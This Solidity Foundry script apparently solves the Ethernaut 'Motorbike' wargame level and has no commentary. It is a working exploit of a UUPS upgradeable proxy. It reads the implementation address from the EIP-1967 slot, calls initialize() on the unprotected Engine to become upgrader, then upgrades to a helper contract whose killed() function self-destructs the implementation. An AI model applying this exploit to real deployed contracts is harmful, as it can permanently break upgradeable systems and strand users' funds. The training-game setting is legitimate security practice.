
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IEngine {
    function horsePower() external view returns (uint256);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;

    function upgrader() external view returns (address);
}

contract MotorbikeAttack {
    function killed() external {
        selfdestruct(payable(msg.sender));
    }

    function contractDestroyed(address engineAddress) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(engineAddress)
        }
        require(size == 0);
    }
}

contract MotorbikeSolution is Script {

    address instanceAddress = 0x98310cFb1Aa669E954B681dee71a31653D490f02;
    IEngine engineAddress = IEngine(address(uint160(uint256(vm.load(address(instanceAddress), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        engineAddress.initialize();

        MotorbikeAttack attack = new MotorbikeAttack();
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(address(attack), encodedData);
        attack.contractDestroyed(address(engineAddress));

        vm.stopBroadcast();
    }
}

